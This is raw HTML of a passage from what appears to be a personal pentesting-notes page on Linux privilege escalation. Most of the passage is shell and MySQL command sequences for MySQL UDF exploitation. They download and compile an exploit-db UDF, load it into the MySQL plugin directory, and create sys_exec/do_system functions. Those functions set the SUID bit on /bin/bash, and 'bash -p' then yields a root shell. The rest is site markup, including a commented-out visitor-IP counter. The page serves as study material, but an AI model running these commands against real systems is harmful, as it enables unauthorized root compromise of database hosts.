<a id=__codelineno-79-7 name=__codelineno-79-7 href=#__codelineno-79-7></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>insert</span> <span class=n>into</span> <span class=n>admin</span> <span class=n>values</span><span class=p>(</span><span class=n>load_file</span><span class=p>(</span><span class=s1>&#39;/tmp/lib_mysqludf_sys.so&#39;</span><span class=p>));</span>
<a id=__codelineno-79-8 name=__codelineno-79-8 href=#__codelineno-79-8></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=nb>select </span><span class=p>*</span> <span class=n>from</span> <span class=n>admin</span> <span class=n>into</span> <span class=n>dumpfile</span> <span class=s1>&#39;/usr/lib/lib_mysqludf_sys.so&#39;</span><span class=p>;</span>
<a id=__codelineno-79-9 name=__codelineno-79-9 href=#__codelineno-79-9></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>create</span> <span class=k>function</span> <span class=n>sys_exec</span> <span class=n>returns</span> <span class=n>integer</span> <span class=n>soname</span> <span class=s1>&#39;lib_mysqludf_sys.so&#39;</span><span class=p>;</span>
<a id=__codelineno-79-10 name=__codelineno-79-10 href=#__codelineno-79-10></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=nb>select </span><span class=n>sys_exec</span><span class=p>(</span><span class=s1>&#39;chmod +s /bin/bash&#39;</span><span class=p>);</span>
<a id=__codelineno-79-11 name=__codelineno-79-11 href=#__codelineno-79-11></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>exit</span>
<a id=__codelineno-79-12 name=__codelineno-79-12 href=#__codelineno-79-12></a><span class=n>Wait</span> <span class=n>a</span> <span class=k>while</span>
<a id=__codelineno-79-13 name=__codelineno-79-13 href=#__codelineno-79-13></a><span class=nb>ls </span><span class=n>-la</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>                         <span class=p>//</span> <span class=n>Verify</span> <span class=n>that</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>bit</span> <span class=n>is</span> <span class=nb>set </span>
<a id=__codelineno-79-14 name=__codelineno-79-14 href=#__codelineno-79-14></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-79-15 name=__codelineno-79-15 href=#__codelineno-79-15></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> Example 3 (Explioting MySQL 4.x/5.0 (Linux))</p> <p>UDF Link: <a href=https://www.exploit-db.com/exploits/1518>https://www.exploit-db.com/exploits/1518</a></p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-80-1 name=__codelineno-80-1 href=#__codelineno-80-1></a><span class=nb>wget </span><span class=n>-O</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span> <span class=n>https</span><span class=p>://</span><span class=n>www</span><span class=p>.</span><span class=n>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>download</span><span class=p>/</span><span class=n>1518</span>
<a id=__codelineno-80-2 name=__codelineno-80-2 href=#__codelineno-80-2></a><span class=n>gcc</span> <span class=err>–</span><span class=n>g</span> <span class=err>–</span><span class=n>shared</span> <span class=err>–</span><span class=n>Wl</span><span class=p>,</span><span class=err>–</span><span class=n>soname</span><span class=p>,</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=err>–</span><span class=n>o</span> <span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span> <span class=err>–</span><span class=n>lc</span>
<a id=__codelineno-80-3 name=__codelineno-80-3 href=#__codelineno-80-3></a><span class=n>chmod</span> <span class=n>777</span> <span class=n>priv</span><span class=p>.</span><span class=n>so</span>
<a id=__codelineno-80-4 name=__codelineno-80-4 href=#__codelineno-80-4></a><span class=nb>mv </span><span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span>
<a id=__codelineno-80-5 name=__codelineno-80-5 href=#__codelineno-80-5></a><span class=n>mysql</span> <span class=n>-u</span> <span class=n>root</span> <span class=n>-p</span> 
<a id=__codelineno-80-6 name=__codelineno-80-6 href=#__codelineno-80-6></a>
<a id=__codelineno-80-7 name=__codelineno-80-7 href=#__codelineno-80-7></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>create</span> <span class=n>table</span> <span class=n>priv</span><span class=p>(</span><span class=n>line</span> <span class=n>blob</span><span class=p>);</span>
<a id=__codelineno-80-8 name=__codelineno-80-8 href=#__codelineno-80-8></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>insert</span> <span class=n>into</span> <span class=n>priv</span> <span class=n>values</span><span class=p>(</span><span class=n>load_file</span><span class=p>(</span><span class=err>‘</span><span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span><span class=err>’</span><span class=p>));</span>
<a id=__codelineno-80-9 name=__codelineno-80-9 href=#__codelineno-80-9></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=nb>select </span><span class=p>*</span> <span class=n>from</span> <span class=n>priv</span> <span class=n>into</span> <span class=n>dumpfile</span> <span class=err>‘</span><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>lib</span><span class=p>/</span><span class=n>mysql</span><span class=p>/</span><span class=n>plugin</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span><span class=err>’</span><span class=p>;</span>
<a id=__codelineno-80-10 name=__codelineno-80-10 href=#__codelineno-80-10></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>create</span> <span class=k>function</span> <span class=n>do_system</span> <span class=n>returns</span> <span class=n>integer</span> <span class=n>soname</span> <span class=err>‘</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span><span class=err>’</span><span class=p>;</span>
<a id=__codelineno-80-11 name=__codelineno-80-11 href=#__codelineno-80-11></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=nb>select </span><span class=n>do_system</span><span class=p>(</span><span class=err>‘</span><span class=n>chmod</span> <span class=p>+</span><span class=n>s</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span><span class=err>’</span><span class=p>);</span>
<a id=__codelineno-80-12 name=__codelineno-80-12 href=#__codelineno-80-12></a><span class=n>mysql</span><span class=p>&gt;!</span><span class=n>sh</span>
<a id=__codelineno-80-13 name=__codelineno-80-13 href=#__codelineno-80-13></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-80-14 name=__codelineno-80-14 href=#__codelineno-80-14></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-80-15 name=__codelineno-80-15 href=#__codelineno-80-15></a>
<a id=__codelineno-80-16 name=__codelineno-80-16 href=#__codelineno-80-16></a><span class=p>//</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span> <span class=n>can</span> <span class=n>be</span> <span class=n>called</span> <span class=n>anything</span>
<a id=__codelineno-80-17 name=__codelineno-80-17 href=#__codelineno-80-17></a><span class=p>//</span> <span class=n>The</span> <span class=s2>&quot;priv&quot;</span> <span class=n>table</span> <span class=n>name</span> <span class=n>can</span> <span class=n>be</span> <span class=n>named</span> <span class=n>anything</span>
<a id=__codelineno-80-18 name=__codelineno-80-18 href=#__codelineno-80-18></a><span class=p>//</span> <span class=n>Ensure</span> <span class=n>that</span> <span class=n>the</span> <span class=n>path</span> <span class=n>to</span> <span class=n>the</span> <span class=n>UDF</span> <span class=p>(.</span><span class=n>so</span><span class=p>)</span> <span class=n>is</span> <span class=n>correct</span>
<a id=__codelineno-80-19 name=__codelineno-80-19 href=#__codelineno-80-19></a><span class=p>//</span> <span class=n>Replace</span> <span class=n>IP</span> <span class=p>&amp;</span> <span class=n>Port</span>
</code></pre></div></p> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 22, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 22, 2023</span> </small> </div> <h2 id=__comments><strong>Comments</strong></h2> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=1 data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script> <script>
  var theme, giscus = document.querySelector("script[src*=giscus]"),
    palette = __md_get("__palette");
  palette && "object" == typeof palette.color && (theme = "slate" === palette.color.scheme ? "dark" : "light", giscus
    .setAttribute("data-theme", theme)), document.addEventListener("DOMContentLoaded", function () {
    document.querySelector("[data-md-component=palette]").addEventListener("change", function () {
      var e = __md_get("__palette");
      e && "object" == typeof e.color && (e = "slate" === e.color.scheme ? "dark" : "light", document
        .querySelector(".giscus-frame").contentWindow.postMessage({
          giscus: {
            setConfig: {
              theme: e
            }
          }
        }, "https://giscus.app"))
    })
  })

</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../windows/ class="md-footer__link md-footer__link--next" aria-label="Next: Windows Privilege Escalation" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Windows Privilege Escalation </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../javascripts/consent.js></script> <script src=../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../javascripts/tablesort.js></script> <script src=../../../overrides/assets/javascripts/bundle.ed7d8744.min.js></script> <script src=../../../overrides/assets/javascripts/cursor-effects.js></script> <!-- <script src="../../../assets/javascripts/cursor-effects.js"></script> --> </body> </html>